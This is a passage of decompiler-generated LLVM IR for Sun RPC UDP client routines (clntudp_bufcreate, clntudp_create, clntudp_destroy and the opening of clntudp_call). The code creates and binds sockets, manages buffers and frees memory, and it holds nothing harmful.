  store i32 %v3_80621ad, i32* %v3_80621b0, align 4
  %v0_80621b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80621b3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80621b3 = add i32 %v1_80621b3, 36
  %v3_80621b3 = inttoptr i32 %v2_80621b3 to i32*
  store i32 %v0_80621b3, i32* %v3_80621b3, align 4
  br label %dec_label_pc_8062234

dec_label_pc_80621b8:                             ; preds = %entry
  %v1_80621b8 = add i32 %v3_8062178, 36
  %v2_80621b8 = inttoptr i32 %v1_80621b8 to i32*
  %v3_80621b8 = load i32, i32* %v2_80621b8, align 4
  store i32 %v3_80621b8, i32* %edx.global-to-local, align 4
  %v1_80621bb = add i32 %v3_8062178, 40
  br label %dec_label_pc_80621d3

dec_label_pc_80621c0:                             ; preds = %entry
  %v2_80621c0 = load i32, i32* %arg3, align 4
  store i32 %v2_80621c0, i32* %edx.global-to-local, align 4
  %v1_80621c2 = add i32 %tmp7, 4
  %v2_80621c2 = inttoptr i32 %v1_80621c2 to i32*
  %v3_80621c2 = load i32, i32* %v2_80621c2, align 4
  %v2_80621c5 = add i32 %v3_8062178, 32
  %v3_80621c5 = inttoptr i32 %v2_80621c5 to i32*
  store i32 %v3_80621c2, i32* %v3_80621c5, align 4
  %v0_80621c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80621c8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80621c8 = add i32 %v1_80621c8, 28
  %v3_80621c8 = inttoptr i32 %v2_80621c8 to i32*
  store i32 %v0_80621c8, i32* %v3_80621c8, align 4
  br label %dec_label_pc_8062234

dec_label_pc_80621cd:                             ; preds = %entry
  %v1_80621cd = add i32 %v3_8062178, 28
  %v2_80621cd = inttoptr i32 %v1_80621cd to i32*
  %v3_80621cd = load i32, i32* %v2_80621cd, align 4
  store i32 %v3_80621cd, i32* %edx.global-to-local, align 4
  %v1_80621d0 = add i32 %v3_8062178, 32
  br label %dec_label_pc_80621d3

dec_label_pc_80621d3:                             ; preds = %dec_label_pc_80621b8, %dec_label_pc_80621cd
  %storemerge.in.in = phi i32 [ %v1_80621d0, %dec_label_pc_80621cd ], [ %v1_80621bb, %dec_label_pc_80621b8 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80621d3 = add i32 %tmp7, 4
  %v3_80621d3 = inttoptr i32 %v2_80621d3 to i32*
  store i32 %storemerge, i32* %v3_80621d3, align 4
  %v0_80621d6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80621d6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80621d6 = inttoptr i32 %v1_80621d6 to i32*
  store i32 %v0_80621d6, i32* %v2_80621d6, align 4
  br label %dec_label_pc_8062234

dec_label_pc_80621da:                             ; preds = %entry
  %v1_80621da = add i32 %v3_8062178, 8
  %v3_80621e2 = bitcast i32* %arg3 to i16*
  %v4_80621e2 = call i32 @memcpy(i16* %v3_80621e2, i32 %v1_80621da, i32 16)
  br label %dec_label_pc_8062239

dec_label_pc_80621f1:                             ; preds = %entry
  %v1_80621f1 = inttoptr i32 %v3_8062178 to i32*
  %v2_80621f1 = load i32, i32* %v1_80621f1, align 4
  br label %dec_label_pc_8062226

dec_label_pc_80621f5:                             ; preds = %entry
  %v1_80621f5 = add i32 %v3_8062178, 88
  %v2_80621f5 = inttoptr i32 %v1_80621f5 to i32*
  %v3_80621f5 = load i32, i32* %v2_80621f5, align 4
  %v1_80621f8 = inttoptr i32 %v3_80621f5 to i32*
  %v2_80621f8 = load i32, i32* %v1_80621f8, align 4
  %v1_80621fa = call i32 @llvm.bswap.i32(i32 %v2_80621f8)
  br label %dec_label_pc_8062226

dec_label_pc_80621fe:                             ; preds = %entry
  %v1_80621fe = add i32 %v3_8062178, 88
  %v2_80621fe = inttoptr i32 %v1_80621fe to i32*
  %v3_80621fe = load i32, i32* %v2_80621fe, align 4
  store i32 %v3_80621fe, i32* %edx.global-to-local, align 4
  %v2_8062201 = load i32, i32* %arg3, align 4
  %v1_8062203 = add i32 %v2_8062201, -1
  %v1_8062204 = call i32 @llvm.bswap.i32(i32 %v1_8062203)
  %v2_8062206 = inttoptr i32 %v3_80621fe to i32*
  store i32 %v1_8062204, i32* %v2_8062206, align 4
  %v0_8062208.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062226.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062208

dec_label_pc_8062208:                             ; preds = %entry, %dec_label_pc_80621fe
  %v1_8062226.pre = phi i32 [ %tmp7, %entry ], [ %v1_8062226.pre.pre, %dec_label_pc_80621fe ]
  %v0_8062208 = phi i32 [ %v3_8062178, %entry ], [ %v0_8062208.pre, %dec_label_pc_80621fe ]
  %v1_8062208 = add i32 %v0_8062208, 88
  %v2_8062208 = inttoptr i32 %v1_8062208 to i32*
  %v3_8062208 = load i32, i32* %v2_8062208, align 4
  %v1_806220b = add i32 %v3_8062208, 16
  %v2_806220b = inttoptr i32 %v1_806220b to i32*
  %v3_806220b = load i32, i32* %v2_806220b, align 4
  %v1_806220e = call i32 @llvm.bswap.i32(i32 %v3_806220b)
  br label %dec_label_pc_8062226

dec_label_pc_8062212:                             ; preds = %entry
  %v1_8062212 = add i32 %v3_8062178, 88
  %v2_8062212 = inttoptr i32 %v1_8062212 to i32*
  %v3_8062212 = load i32, i32* %v2_8062212, align 4
  store i32 %v3_8062212, i32* %edx.global-to-local, align 4
  %v2_8062215 = load i32, i32* %arg3, align 4
  %v1_8062217 = call i32 @llvm.bswap.i32(i32 %v2_8062215)
  %v2_8062219 = add i32 %v3_8062212, 16
  %v3_8062219 = inttoptr i32 %v2_8062219 to i32*
  store i32 %v1_8062217, i32* %v3_8062219, align 4
  br label %dec_label_pc_8062234

dec_label_pc_806221e:                             ; preds = %entry
  %v1_806221e = add i32 %v3_8062178, 88
  %v2_806221e = inttoptr i32 %v1_806221e to i32*
  %v3_806221e = load i32, i32* %v2_806221e, align 4
  %v1_8062221 = add i32 %v3_806221e, 12
  %v2_8062221 = inttoptr i32 %v1_8062221 to i32*
  %v3_8062221 = load i32, i32* %v2_8062221, align 4
  %v1_8062224 = call i32 @llvm.bswap.i32(i32 %v3_8062221)
  br label %dec_label_pc_8062226

dec_label_pc_8062226:                             ; preds = %dec_label_pc_8062208, %dec_label_pc_80621f5, %dec_label_pc_80621f1, %dec_label_pc_806221e
  %v1_8062226 = phi i32 [ %v1_8062226.pre, %dec_label_pc_8062208 ], [ %tmp7, %dec_label_pc_80621f5 ], [ %tmp7, %dec_label_pc_80621f1 ], [ %tmp7, %dec_label_pc_806221e ]
  %v0_8062226 = phi i32 [ %v1_806220e, %dec_label_pc_8062208 ], [ %v1_80621fa, %dec_label_pc_80621f5 ], [ %v2_80621f1, %dec_label_pc_80621f1 ], [ %v1_8062224, %dec_label_pc_806221e ]
  %v2_8062226 = inttoptr i32 %v1_8062226 to i32*
  store i32 %v0_8062226, i32* %v2_8062226, align 4
  br label %dec_label_pc_8062234

dec_label_pc_806222a:                             ; preds = %entry
  %v1_806222a = add i32 %v3_8062178, 88
  %v2_806222a = inttoptr i32 %v1_806222a to i32*
  %v3_806222a = load i32, i32* %v2_806222a, align 4
  store i32 %v3_806222a, i32* %edx.global-to-local, align 4
  %v2_806222d = load i32, i32* %arg3, align 4
  %v1_806222f = call i32 @llvm.bswap.i32(i32 %v2_806222d)
  %v2_8062231 = add i32 %v3_806222a, 12
  %v3_8062231 = inttoptr i32 %v2_8062231 to i32*
  store i32 %v1_806222f, i32* %v3_8062231, align 4
  br label %dec_label_pc_8062234

dec_label_pc_8062234:                             ; preds = %dec_label_pc_8062212, %dec_label_pc_8062226, %dec_label_pc_80621c0, %dec_label_pc_80621d3, %dec_label_pc_80621ab, %dec_label_pc_806219f, %dec_label_pc_8062193, %dec_label_pc_806222a
  br label %dec_label_pc_8062239

dec_label_pc_8062239:                             ; preds = %dec_label_pc_80621da, %dec_label_pc_806218c, %dec_label_pc_8062234
  %v0_806223c = phi i32 [ 1, %dec_label_pc_80621da ], [ 0, %dec_label_pc_806218c ], [ 1, %dec_label_pc_8062234 ]
  %v2_8062239 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062239, i32* %edx.global-to-local, align 4
  ret i32 %v0_806223c

; uselistorder directives
  uselistorder i32 %v3_8062178, { 15, 14, 13, 11, 12, 10, 7, 3, 6, 5, 4, 2, 1, 0, 9, 8, 16 }
  uselistorder i32 %tmp7, { 4, 5, 6, 0, 2, 3, 1, 7 }
  uselistorder i32* %edx.global-to-local, { 10, 0, 1, 2, 6, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg3, { 5, 4, 3, 1, 2, 0, 6 }
  uselistorder label %dec_label_pc_8062239, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062234, { 7, 1, 0, 3, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_8062226, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8062208, { 1, 0 }
  uselistorder label %dec_label_pc_80621d3, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg5 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806223e = load i32, i32* @edi, align 4
  %v0_806223f = load i32, i32* @esi, align 4
  %v0_8062240 = load i32, i32* @ebx, align 4
  store i32 %v0_8062240, i32* %stack_var_-16, align 4
  %v2_8062246 = call i32 @malloc(i32 12)
  %v1_8062259 = add i32 %arg6, 3
  %v1_806225c = add i32 %arg7, 3
  %v1_806225f = and i32 %v1_8062259, -4
  store i32 %v1_806225f, i32* @edi, align 4
  %v1_8062262 = and i32 %v1_806225c, -4
  store i32 %v1_8062262, i32* @ebx, align 4
  store i32 %v2_8062246, i32* @ebp, align 4
  %v2_8062267 = add i32 %v1_806225f, 100
  %v3_8062267 = add i32 %v2_8062267, %v1_8062262
  store i32 %v3_8062267, i32* %eax.global-to-local, align 4
  %v2_806226e = call i32 @malloc(i32 %v3_8062267)
  store i32 %v2_806226e, i32* %eax.global-to-local, align 4
  store i32 %v2_806226e, i32* @esi, align 4
  %v0_8062278 = load i32, i32* @ebp, align 4
  %v1_8062278 = icmp eq i32 %v0_8062278, 0
  br i1 %v1_8062278, label %dec_label_pc_8062280, label %dec_label_pc_806227c

dec_label_pc_806227c:                             ; preds = %entry
  %v1_806227c = icmp eq i32 %v2_806226e, 0
  %v1_806227e = icmp eq i1 %v1_806227c, false
  br i1 %v1_806227e, label %dec_label_pc_80622ae, label %dec_label_pc_8062280

dec_label_pc_8062280:                             ; preds = %entry, %dec_label_pc_806227c
  %v0_8062280 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8062280, i32* %eax.global-to-local, align 4
  %v0_8062287 = load i32, i32* @global_var_8074610, align 16
  store i32 %v0_8062280, i32* @ebx, align 4
  %v3_8062294 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_806e198.793 to i32), i32 %v0_8062287)
  store i32 %v3_8062294, i32* %eax.global-to-local, align 4
  %v0_806229c = load i32, i32* @ebx, align 4
  %v1_806229c = inttoptr i32 %v0_806229c to i32*
  store i32 12, i32* %v1_806229c, align 4
  %v0_80622a2 = load i32, i32* @ebx, align 4
  %v1_80622a2 = add i32 %v0_80622a2, 8
  %v2_80622a2 = inttoptr i32 %v1_80622a2 to i32*
  store i32 12, i32* %v2_80622a2, align 4
  br label %dec_label_pc_8062449

dec_label_pc_80622ae:                             ; preds = %dec_label_pc_806227c
  %v1_80622ae = load i32, i32* @ebx, align 4
  %v2_80622ae = add i32 %v2_806226e, 96
  %v3_80622ae = add i32 %v2_80622ae, %v1_80622ae
  %v2_80622b2 = add i32 %v2_806226e, 88
  %v3_80622b2 = inttoptr i32 %v2_80622b2 to i32*
  store i32 %v3_80622ae, i32* %v3_80622b2, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_80622b9 = add i32 %arg1, 2
  %v2_80622b9 = inttoptr i32 %v1_80622b9 to i16*
  %v3_80622b9 = load i16, i16* %v2_80622b9, align 2
  %v4_80622b9 = icmp eq i16 %v3_80622b9, 0
  %v1_80622be = icmp eq i1 %v4_80622b9, false
  br i1 %v1_80622be, label %dec_label_pc_80622e8, label %dec_label_pc_80622c0

dec_label_pc_80622c0:                             ; preds = %dec_label_pc_80622ae
  %v5_80622cb = call i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 17)
  store i32 %v5_80622cb, i32* %eax.global-to-local, align 4
  %v3_80622d3 = trunc i32 %v5_80622cb to i16
  %v4_80622d3 = icmp eq i16 %v3_80622d3, 0
  br i1 %v4_80622d3, label %dec_label_pc_8062449, label %dec_label_pc_80622dc

dec_label_pc_80622dc:                             ; preds = %dec_label_pc_80622c0
  %v2_80622e0 = call i16 @llvm.bswap.i16(i16 %v3_80622d3)
  %v3_80622e0 = zext i16 %v2_80622e0 to i32
  %v5_80622e0 = and i32 %v5_80622cb, -65536
  %v6_80622e0 = or i32 %v3_80622e0, %v5_80622e0
  store i32 %v6_80622e0, i32* %eax.global-to-local, align 4
  store i16 %v2_80622e0, i16* %v2_80622b9, align 2
  br label %dec_label_pc_80622e8

dec_label_pc_80622e8:                             ; preds = %dec_label_pc_80622ae, %dec_label_pc_80622dc
  %v0_80622e8 = load i32, i32* @ebp, align 4
  %v1_80622e8 = add i32 %v0_80622e8, 4
  %v2_80622e8 = inttoptr i32 %v1_80622e8 to i32*
  store i32 ptrtoint (i32* @global_var_807486c.794 to i32), i32* %v2_80622e8, align 4
  %v1_80622ef = load i32, i32* @ebp, align 4
  %v2_80622ef = add i32 %v1_80622ef, 8
  %v3_80622ef = inttoptr i32 %v2_80622ef to i32*
  store i32 %v2_806226e, i32* %v3_80622ef, align 4
  %v1_80622f9 = add i32 %v2_806226e, 8
  store i32 %v1_80622f9, i32* %eax.global-to-local, align 4
  %tmp36 = inttoptr i32 %v1_80622f9 to i16*
  %v5_80622fd = call i32 @memcpy(i16* %tmp36, i32 %arg1, i32 16)
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_806230d = add i32 %v2_806226e, 28
  %v3_806230d = inttoptr i32 %v2_806230d to i32*
  store i32 %arg4, i32* %v3_806230d, align 4
  %v0_8062310 = load i32, i32* @ebx, align 4
  %v2_8062310 = add i32 %v2_806226e, 92
  %v3_8062310 = inttoptr i32 %v2_8062310 to i32*
  store i32 %v0_8062310, i32* %v3_8062310, align 4
  %v1_8062313 = add i32 %v2_806226e, 24
  %v2_8062313 = inttoptr i32 %v1_8062313 to i32*
  store i32 16, i32* %v2_8062313, align 4
  %v0_806231a = load i32, i32* %eax.global-to-local, align 4
  %v2_806231a = add i32 %v2_806226e, 32
  %v3_806231a = inttoptr i32 %v2_806231a to i32*
  store i32 %v0_806231a, i32* %v3_806231a, align 4
  %v1_806231d = add i32 %v2_806226e, 36
  %v2_806231d = inttoptr i32 %v1_806231d to i32*
  store i32 -1, i32* %v2_806231d, align 4
  %v1_8062324 = add i32 %v2_806226e, 40
  %v2_8062324 = inttoptr i32 %v1_8062324 to i32*
  store i32 -1, i32* %v2_8062324, align 4
  %v0_806232b = load i32, i32* @edi, align 4
  %v2_806232b = add i32 %v2_806226e, 84
  %v3_806232b = inttoptr i32 %v2_806232b to i32*
  store i32 %v0_806232b, i32* %v3_806232b, align 4
  %v0_806232e = call i32 @_create_xid()
  store i32 %v0_806232e, i32* %stack_var_-72, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-112, align 4
  %v0_8062359 = load i32, i32* @edi, align 4
  %v1_806235a = add i32 %v2_806226e, 56
  store i32 %v1_806235a, i32* @ebx, align 4
  %v3_806235d = load i32, i32* %v3_80622b2, align 4
  %v4_8062361 = inttoptr i32 %v1_806235a to i32*
  %v5_8062361 = call i32 @__GI_xdrmem_create(i32* %v4_8062361, i32 %v3_806235d, i32 %v0_8062359, i32 0)
  %v2_8062369 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8062369, i32* @eax, align 4
  %v0_806236e = load i32, i32* @ebx, align 4
  %tmp37 = inttoptr i32 %v0_806236e to i32*
  %v4_806236f = call i32 @__GI_xdr_callhdr(i32* %tmp37, i32 %v2_8062369)
  store i32 %v4_806236f, i32* %eax.global-to-local, align 4
  %v1_8062377 = icmp eq i32 %v4_806236f, 0
  br i1 %v1_8062377, label %dec_label_pc_8062449, label %dec_label_pc_806237f

dec_label_pc_806237f:                             ; preds = %dec_label_pc_80622e8
  %v1_8062382 = add i32 %v2_806226e, 60
  %v2_8062382 = inttoptr i32 %v1_8062382 to i32*
  %v3_8062382 = load i32, i32* %v2_8062382, align 4
  store i32 %v3_8062382, i32* %eax.global-to-local, align 4
  store i32 134620041, i32* %stack_var_-112, align 4
  %v5_8062386 = add i32 %v3_8062382, 16
  %v6_8062386 = inttoptr i32 %v5_8062386 to i32*
  %v7_8062386 = load i32, i32* %v6_8062386, align 4
  call void @__pseudo_call(i32 %v7_8062386)
  %v0_806238c = load i32, i32* %eax.global-to-local, align 4
  %v2_806238c = add i32 %v2_806226e, 80
  %v3_806238c = inttoptr i32 %v2_806238c to i32*
  store i32 %v0_806238c, i32* %v3_806238c, align 4
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_8062393 = load i32, i32* %arg5, align 4
  %v4_8062393 = icmp slt i32 %v2_8062393, 0
  %v1_8062396 = icmp eq i1 %v4_8062393, false
  br i1 %v1_8062396, label %dec_label_pc_8062430, label %dec_label_pc_806239c

dec_label_pc_806239c:                             ; preds = %dec_label_pc_806237f
  store i32 1, i32* %stack_var_-24, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v4_80623ab = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_80623ab, i32* %eax.global-to-local, align 4
  %v2_80623ba = icmp slt i32 %v4_80623ab, 0
  store i32 %v4_80623ab, i32* %arg5, align 4
  %v1_80623be = icmp eq i1 %v2_80623ba, false
  br i1 %v1_80623be, label %dec_label_pc_80623d9, label %dec_label_pc_80623c0

dec_label_pc_80623c0:                             ; preds = %dec_label_pc_806239c
  %v0_80623c0 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80623c0, i32* %eax.global-to-local, align 4
  store i32 %v0_80623c0, i32* @ebx, align 4
  %v1_80623c7 = inttoptr i32 %v0_80623c0 to i32*
  store i32 12, i32* %v1_80623c7, align 4
  %v0_80623cd = load i32, i32* %stack_var_-112, align 4
  %v1_80623cd = call i32 @__errno_location(i32 %v0_80623cd)
  store i32 %v1_80623cd, i32* %eax.global-to-local, align 4
  %v1_80623d2 = inttoptr i32 %v1_80623cd to i32*
  %v2_80623d2 = load i32, i32* %v1_80623d2, align 4
  store i32 %v2_80623d2, i32* %eax.global-to-local, align 4
  %v1_80623d4 = load i32, i32* @ebx, align 4
  %v2_80623d4 = add i32 %v1_80623d4, 8
  %v3_80623d4 = inttoptr i32 %v2_80623d4 to i32*
  store i32 %v2_80623d2, i32* %v3_80623d4, align 4
  br label %dec_label_pc_8062449

dec_label_pc_80623d9:                             ; preds = %dec_label_pc_806239c
  %v0_80623d9 = load i32, i32* @ecx, align 4
  store i32 %v4_80623ab, i32* %stack_var_-112, align 4
  %v6_80623de = call i32 @__GI_bindresvport(i32 %v4_80623ab, i16* null, i32 %v0_80623d9, i32 %v0_80623d9)
  %v2_80623e3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_80623f7 = load i32, i32* %arg5, align 4
  store i32 %v2_80623f7, i32* %stack_var_-112, align 4
  %v4_80623f9 = call i32 @ioctl(i32 %v2_80623f7, i32 21537, i32 %v2_80623e3)
  %v2_80623fe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80623fe, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-112, align 4
  %v2_806241d = load i32, i32* %arg5, align 4
  %v5_806241f = call i32 @__GI_setsockopt(i32 %v2_806241d, i32 0, i32 11, i32 %v2_80623fe, i32 4)
  store i32 %v5_806241f, i32* %eax.global-to-local, align 4
  %v1_8062427 = add i32 %v2_806226e, 4
  %v2_8062427 = inttoptr i32 %v1_8062427 to i32*
  store i32 1, i32* %v2_8062427, align 4
  br label %dec_label_pc_8062437

dec_label_pc_8062430:                             ; preds = %dec_label_pc_806237f
  %v1_8062430 = add i32 %v2_806226e, 4
  %v2_8062430 = inttoptr i32 %v1_8062430 to i32*
  store i32 0, i32* %v2_8062430, align 4
  br label %dec_label_pc_8062437

dec_label_pc_8062437:                             ; preds = %dec_label_pc_80623d9, %dec_label_pc_8062430
  %v2_806243b = load i32, i32* %arg5, align 4
  store i32 %v2_806243b, i32* %eax.global-to-local, align 4
  %v2_806243d = inttoptr i32 %v2_806226e to i32*
  store i32 %v2_806243b, i32* %v2_806243d, align 4
  %v0_806243f = call i32 @authnone_create()
  store i32 %v0_806243f, i32* %eax.global-to-local, align 4
  %v1_8062444 = load i32, i32* @ebp, align 4
  %v2_8062444 = inttoptr i32 %v1_8062444 to i32*
  store i32 %v0_806243f, i32* %v2_8062444, align 4
  br label %dec_label_pc_806246b

dec_label_pc_8062449:                             ; preds = %dec_label_pc_80622e8, %dec_label_pc_80622c0, %dec_label_pc_80623c0, %dec_label_pc_8062280
  %v1_8062449 = icmp eq i32 %v2_806226e, 0
  br i1 %v1_8062449, label %dec_label_pc_8062459, label %dec_label_pc_806244d

dec_label_pc_806244d:                             ; preds = %dec_label_pc_8062449
  %v2_8062451 = call i32 @free(i32 %v2_806226e)
  store i32 %v2_8062451, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062459

dec_label_pc_8062459:                             ; preds = %dec_label_pc_8062449, %dec_label_pc_806244d
  %v0_8062459 = load i32, i32* @ebp, align 4
  %v1_8062459 = icmp eq i32 %v0_8062459, 0
  br i1 %v1_8062459, label %dec_label_pc_806246b, label %dec_label_pc_806245d

dec_label_pc_806245d:                             ; preds = %dec_label_pc_8062459
  store i32 0, i32* @ebp, align 4
  %v2_8062463 = call i32 @free(i32 %v0_8062459)
  store i32 %v2_8062463, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806246b

dec_label_pc_806246b:                             ; preds = %dec_label_pc_8062459, %dec_label_pc_8062437, %dec_label_pc_806245d
  %v0_806246e = load i32, i32* @ebp, align 4
  store i32 %v0_806246e, i32* %eax.global-to-local, align 4
  %v2_8062471 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062471, i32* @esi, align 4
  store i32 %v0_806223f, i32* @edi, align 4
  store i32 %v0_806223e, i32* @ebp, align 4
  ret i32 %v0_806246e

; uselistorder directives
  uselistorder i32 %v4_80623ab, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_806226e, { 13, 0, 9, 17, 1, 10, 7, 16, 14, 12, 5, 8, 11, 3, 2, 15, 4, 6, 18, 19, 20, 21 }
  uselistorder i32* %stack_var_-112, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %arg5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_806246b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062459, { 1, 0 }
  uselistorder label %dec_label_pc_8062449, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8062437, { 1, 0 }
  uselistorder label %dec_label_pc_80622e8, { 1, 0 }
  uselistorder label %dec_label_pc_8062280, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v8_806249a = inttoptr i32 %arg5 to i32*
  %v9_806249a = call i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %v8_806249a, i32 %arg6, i32 8800, i32 8800)
  ret i32 %v9_806249a
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80624a3 = load i32, i32* @esi, align 4
  %v0_80624a4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80624ac = add i32 %arg1, 8
  %v2_80624ac = inttoptr i32 %v1_80624ac to i32*
  %v3_80624ac = load i32, i32* %v2_80624ac, align 4
  store i32 %v3_80624ac, i32* @ebx, align 4
  %v1_80624af = add i32 %v3_80624ac, 4
  %v2_80624af = inttoptr i32 %v1_80624af to i32*
  %v3_80624af = load i32, i32* %v2_80624af, align 4
  %v4_80624af = icmp eq i32 %v3_80624af, 0
  br i1 %v4_80624af, label %dec_label_pc_80624c2, label %dec_label_pc_80624b5

dec_label_pc_80624b5:                             ; preds = %entry
  %v1_80624b8 = inttoptr i32 %v3_80624ac to i32*
  %v2_80624b8 = load i32, i32* %v1_80624b8, align 4
  %v1_80624ba = call i32 @__libc_close(i32 %v2_80624b8)
  %v0_80624c2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80624c2

dec_label_pc_80624c2:                             ; preds = %entry, %dec_label_pc_80624b5
  %v0_80624cf = phi i32 [ %v3_80624ac, %entry ], [ %v0_80624c2.pre, %dec_label_pc_80624b5 ]
  %v1_80624c2 = add i32 %v0_80624cf, 60
  %v2_80624c2 = inttoptr i32 %v1_80624c2 to i32*
  %v3_80624c2 = load i32, i32* %v2_80624c2, align 4
  %v1_80624c5 = add i32 %v3_80624c2, 28
  %v2_80624c5 = inttoptr i32 %v1_80624c5 to i32*
  %v3_80624c5 = load i32, i32* %v2_80624c5, align 4
  %v1_80624c8 = icmp eq i32 %v3_80624c5, 0
  br i1 %v1_80624c8, label %dec_label_pc_80624d8, label %dec_label_pc_80624cc

dec_label_pc_80624cc:                             ; preds = %dec_label_pc_80624c2
  call void @__pseudo_call(i32 %v3_80624c5)
  %v0_80624db.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80624d8

dec_label_pc_80624d8:                             ; preds = %dec_label_pc_80624c2, %dec_label_pc_80624cc
  %v0_80624db = phi i32 [ %v0_80624db.pre, %dec_label_pc_80624cc ], [ %v0_80624cf, %dec_label_pc_80624c2 ]
  %v1_80624dc = call i32 @free(i32 %v0_80624db)
  %v0_80624e1 = load i32, i32* @esi, align 4
  store i32 %v0_80624a4, i32* @ebx, align 4
  store i32 %v0_80624a3, i32* @esi, align 4
  %v1_80624ea = call i32 @free(i32 %v0_80624e1)
  ret i32 %v1_80624ea

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80624d8, { 1, 0 }
  uselistorder label %dec_label_pc_80624c2, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp79 = call i16 @__decompiler_undefined_function_2()
  %tmp80 = call i8 @__decompiler_undefined_function_5()
  %tmp88 = call i8 @__decompiler_undefined_function_5()
  %tmp89 = call i8 @__decompiler_undefined_function_5()
  %tmp90 = call i32 @__decompiler_undefined_function_0()
  %tmp92 = call i32 @__decompiler_undefined_function_0()
  %tmp111 = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i16, align 2
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80624ef = load i32, i32* @ebp, align 4
  store i32 %v0_80624ef, i32* %stack_var_-4, align 4
  %v4_80624ef = ptrtoint i32* %stack_var_-4 to i32
  store i32 1000, i32* %edx.global-to-local, align 4
  store i32 %v4_80624ef, i32* @ebp, align 4
  %v0_80624f7 = load i32, i32* @edi, align 4
  %v0_80624f8 = load i32, i32* @esi, align 4
  %v0_80624f9 = load i32, i32* @ebx, align 4
  %v15_80624fa = ptrtoint i32* %stack_var_-9036 to i32
  store i32 1000, i32* @ebx, align 4
